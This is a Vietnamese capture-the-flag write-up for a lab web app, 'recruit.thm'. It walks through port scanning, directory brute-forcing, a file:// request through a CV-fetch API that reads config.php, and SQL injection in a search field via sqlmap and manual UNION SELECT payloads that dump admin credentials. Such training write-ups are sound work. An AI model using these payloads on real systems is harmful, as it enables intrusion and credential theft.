
## senarior

Recruit vừa ra mắt cổng tuyển dụng mới, cho phép nhân viên HR quản lý đơn ứng tuyển và quản trị viên giám sát các quyết định tuyển dụng. Mặc dù nền tảng trông có vẻ hoạt động được, ban quản lý nghi ngờ rằng bảo mật có thể đã bị bỏ qua trong quá trình phát triển. Nhiệm vụ của bạn là đánh giá ứng dụng như một kẻ tấn công thực sự: lập bản đồ cấu trúc, lạm dụng chức năng bị lộ và khai thác lỗ hổng.

Liệu bạn có thể có được foothold ban đầu, leo thang quyền truy cập và cuối cùng đăng nhập với tư cách quản trị viên không?

## Tóm tắt
- [ ] dùng sql map với các file request từ burp suite.trường search đôi khi chứa sql injection


- [ ] gặp cổng login
- [ ] đọc robot, và sitemap-> ko cso gì
- [ ] gobuster
	- [ ] đọc /mail/mail.log-> biết được có username là hr và pass nằm ở /config.php
	- [ ] thử truy cập nhưng thất bại
	- [ ] sau đó để ý trong phần api, người ta viết rằng có 1 api là /api/file.php?cv=.....1 url ==> mình thử dùng cách này để ssrf tới config.php==> truy cập được config.php
- [ ] đăng nhập với tư cách hr
- [ ] để ý là có trường seearch==> có khả năng sql injjection
- [ ] dùng sql map đẻ check==> lôi ra được các bảng và là Mysql 
- [ ] check cột và kiểu dữ liệu các cột==> UNION SELECT --> credential của admin==> đăng nhập với tư cách admin và lấy flag
### recon

Mình dùng `rustscan -b 500 -a recruit.thm --top -- -sC -sV -Pn` để liệt kê tất cả cổng TCP trên máy mục tiêu, sau đó đẩy kết quả tìm được vào Nmap, chạy các script NSE mặc định `-sC`, dò phiên bản dịch vụ `-sV`, và coi host là đang online mà không cần ICMP echo `-Pn`.

Kích thước batch 500 đánh đổi tốc độ lấy độ ổn định; mặc định 1500 cân bằng cả hai, còn kích thước lớn hơn nhiều giúp tăng thông lượng nhưng dễ bỏ sót phản hồi và gây mất ổn định.

```bash
rustscan -b 500 -a recruit.thm --top -- -sC -sV -Pn
```

Mình phát hiện ba cổng đang mở. Trong đó có 22 (SSH), 53 (DNS) và 80 (HTTP). SSH chạy OpenSSH 8.2p1, DNS dùng ISC BIND 9.16.1, còn web server được host bằng Apache 2.4.41.

Đầu tiên, mình truy cập site bằng trình duyệt và thấy một trang đăng nhập. Ở footer, có link tới API.

```text
http://recruit.thm/
```

Một tính năng thú vị của API là khả năng lấy CV. Dựa trên cấu trúc, có vẻ như các file đang được lấy trực tiếp từ hệ thống. Mình ghi chú đây là một vector tấn công tiềm năng: local file inclusion (LFI).

```text
http://recruit.thm/api.php
```

Mình tiếp tục liệt kê và quét thư mục để tìm thêm path và page. Với việc này, mình dùng Feroxbuster. Đường dẫn `/mail/mail.log` nổi bật. Nó có thể chứa thông tin nhạy cảm.

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://recruit.thm'
```

### Truy cập với tư cách hr

Mình truy cập endpoint thú vị đó và thật vậy, có sẵn một email. Email nói rằng username tài khoản HR là `hr` và thông tin đăng nhập của nó được lưu tạm thời trong file `config.php` của ứng dụng, trong khi thông tin đăng nhập quản trị viên chỉ được lưu an toàn trong database backend.

Đây là một gợi ý lớn và ám chỉ mạnh rằng mình có thể cần khai thác LFI để đọc file config và, nếu có thể, xâm phạm database để có quyền admin.

```text
http://recruit.thm/mail/mail.log
```

Mình thử đọc file `/var/www/html/config.php`, hy vọng web app không thực thi file PHP. Và may mắn thay, file `config.php` đọc được, nên mình có thể trích xuất trực tiếp mật khẩu HR từ đó.

```text
http://recruit.thm//file.php?cv=file:///var/www/html/config.php
```

Mình quay lại trang index và gửi thông tin đăng nhập...

```text
http://recruit.thm/
```

... mình đăng nhập được và lấy flag đầu tiên. Trước mắt là danh sách ứng viên mà mình có thể lọc bằng chức năng tìm kiếm.

```text
http://recruit.thm/dashboard.php
```

### Truy cập với tư cách admin

Mình kiểm tra xem chức năng tìm kiếm có dính SQL injection không. Mình dùng payload nhỏ nhất, `#`. Và phát hiện là có. Mình nhận được lỗi SQL, dấu hiệu mạnh cho thấy field này dễ bị SQL injection.

```text
http://recruit.thm/dashboard.php?search='
```

### Hướng tự động

Bắt đầu bằng cách đơn giản nhất, mình thử giải quyết bằng SQLMap. Để làm vậy, mình chặn một request bằng Burp Suite, rồi dùng nó với SQLMap.

Mình xác định được database `recruit-db`.

```bash
sqlmap -r req.txt -dbs
```

Tiếp theo, mình liệt kê các bảng và tìm thấy bảng `users`.

```bash
sqlmap -r req.txt -D recruit_db --tables
```

Tiếp theo, mình dump bảng `users` và lấy được thông tin đăng nhập admin.

```bash
sqlmap -r req.txt -D recruit_db -T users --dump
```

Mình đăng xuất và đăng nhập với tư cách admin bằng thông tin vừa tìm được, và nhận được flag cuối.

```text
http://recruit.thm/dashboard.php
```

### Hướng thủ công

Đầu tiên, mình bắt đầu xác định tổng số cột trong câu lệnh SQL gốc.

```sql
' ORDER BY 1 -- -
```

Với `ORDER BY 5`, mình nhận lỗi, nên giống như bảng gợi ý, chỉ có 4 cột.

```sql
' ORDER BY 5 -- -
```

Tiếp theo, mình thử xác nhận xem SQL injection dạng UNION có khả thi không và xác định cột nào được phản chiếu trong phản hồi của ứng dụng để hiển thị dữ liệu trích xuất. Vì mọi field đều được phản chiếu, mình chuyển sang liệt kê database.

```sql
' UNION SELECT 1,2,3,4 -- -
```

Mình liệt kê tất cả tên database trên MySQL server bằng cách truy vấn `information_schema.schemata` và xác định `recruit_db`.

```sql
' UNION SELECT 1,2,GROUP_CONCAT(schema_name),4 FROM information_schema.schemata -- -
```

Tiếp theo, mình liệt kê tất cả bảng bên trong database `recruit_db` bằng cách truy vấn `information_schema.tables`. Mình xác định được bảng `candidates` và `users`.

```sql
' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema='recruit_db' -- -
```

Bây giờ mình thử liệt kê tất cả tên cột trong bảng `users` và xác định các field `username` và `password`.

```sql
' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='users' -- -
```

Cuối cùng, mình trích xuất và nối nội dung của các cột `username` và `password` từ bảng `users`.

```sql
' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password),4 FROM users -- -
```

Mình đăng xuất và đăng nhập với tư cách admin bằng thông tin vừa tìm được, và nhận được flag cuối.

```text
http://recruit.thm/dashboard.php
```
![[Pasted image 20260921142037.png]]